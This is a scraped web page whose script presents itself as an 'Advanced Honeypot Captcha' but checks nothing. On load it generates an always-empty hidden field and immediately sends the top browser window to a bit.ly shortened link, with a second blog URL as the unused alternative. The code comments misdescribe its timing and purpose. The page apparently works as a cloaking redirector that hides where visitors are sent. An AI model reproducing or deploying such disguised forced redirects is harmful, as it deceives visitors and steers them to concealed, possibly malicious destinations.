redirect.smashwatch.com/2024/03/

redirect

 <style>
        .loading-spinner-container {
            display: none;
            margin-top: 20px;
            text-align: center;
        }

        .loading-spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-radius: 50%;
            border-top: 4px solid #3498db;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>


<h2>Advanced Honeypot Captcha with Redirect</h2>

<!-- Dynamically generated honeypot field -->
<div id="honeypot-container" style="display:none"></div>

<!-- Loading spinner widget -->
<div id="loading-spinner-container" class="loading-spinner-container">
    <div class="loading-spinner"></div>
    <p>Loading...</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", function () {
    // Generate a dynamic honeypot field
    generateHoneypotField();

    // Show the loading spinner while redirecting
    document.getElementById('loading-spinner-container').style.display = 'block';

    // Check if the honeypot field is empty (indicating it's likely a human)
    const honeypotValue = document.getElementById('honeypot').value;

    if (!honeypotValue) {
        // Redirect to the specified URL if the captcha is validated
        setTimeout(function () {
            window.top.location.href = 'https://bit.ly/amber-moore';
        }, 200); // Simulating a 2-second delay for demonstration purposes
    } else {
        // Redirect to another URL if the captcha is not validated
        setTimeout(function () {
            window.top.location.href = 'https://www.smokeebash.com/2024/03/pepe.html';
        }, 200); // Simulating a 2-second delay for demonstration purposes
    }
});

function generateHoneypotField() {
    // Dynamically create and append the honeypot field
    const honeypotContainer = document.getElementById('honeypot-container');
    const honeypotField = document.createElement('input');

    honeypotField.type = 'text';
    honeypotField.id = 'honeypot';
    honeypotField.name = 'honeypot';
    honeypotField.value = ''; // Leave it empty

    // Apply some obfuscation to the honeypot field
    honeypotField.style.display = 'none';

    // Append the honeypot field to the container
    honeypotContainer.appendChild(honeypotField);
}
</script>

